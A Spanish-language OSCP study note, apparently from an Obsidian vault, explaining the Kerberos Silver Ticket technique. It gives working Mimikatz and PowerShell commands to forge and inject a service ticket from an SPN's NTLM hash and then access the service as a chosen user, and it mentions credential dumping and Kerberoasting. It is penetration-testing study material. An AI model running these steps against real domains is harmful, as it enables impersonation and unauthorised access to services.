---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, ad, explotacion, windows]
---

# Silver Ticket

> [!abstract] Qué es y cuándo usarla
> Con el **hash NTLM de una service account (SPN)** puedes **forjar localmente** un service ticket (TGS) para ese SPN, con los grupos/permisos que quieras, sin tocar el KDC. Útil para acceder a un servicio (IIS, CIFS, MSSQL...) como cualquier usuario/admin una vez tienes el hash del SPN.

## Requisitos previos
- **Hash NTLM del SPN** (p.ej. de Mimikatz `sekurlsa::logonpasswords` donde el SPN tiene sesión, o crackeado por Kerberoasting).
- **Domain SID** (`whoami /user`, quitando el RID).
- **Target SPN** (host + servicio).

## Pasos
```powershell
whoami /user      # domain SID = todo menos el ultimo -RID
```
```text
# Mimikatz (kerberos::golden sirve para silver y golden)
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt ^
  /target:web04.corp.com /service:http /rc4:<NTLM_del_SPN> /user:jeffadmin
#   /ptt  = inyecta el ticket en la sesion actual
#   /user = cualquier usuario del dominio (tu eliges grupos/permisos via PAC)
```
```powershell
klist                                 # confirmar ticket cacheado
iwr -UseDefaultCredentials http://web04   # acceder al servicio como el user forjado
```

> [!warning] Detección / problemas
> - Funciona porque la app casi nunca hace **PAC validation**.
> - Patch **PAC_REQUESTOR** (oct 2022): no se pueden forjar tickets para usuarios **inexistentes** si cliente y KDC están en el mismo dominio → usa un user real.
> - Servicios comunes: `/service:http`, `cifs`, `mssql`, `host`, `ldap`...

## Visto en
- Módulo: [[23 - Attacking Active Directory Authentication]]
- Máquinas: [[]]
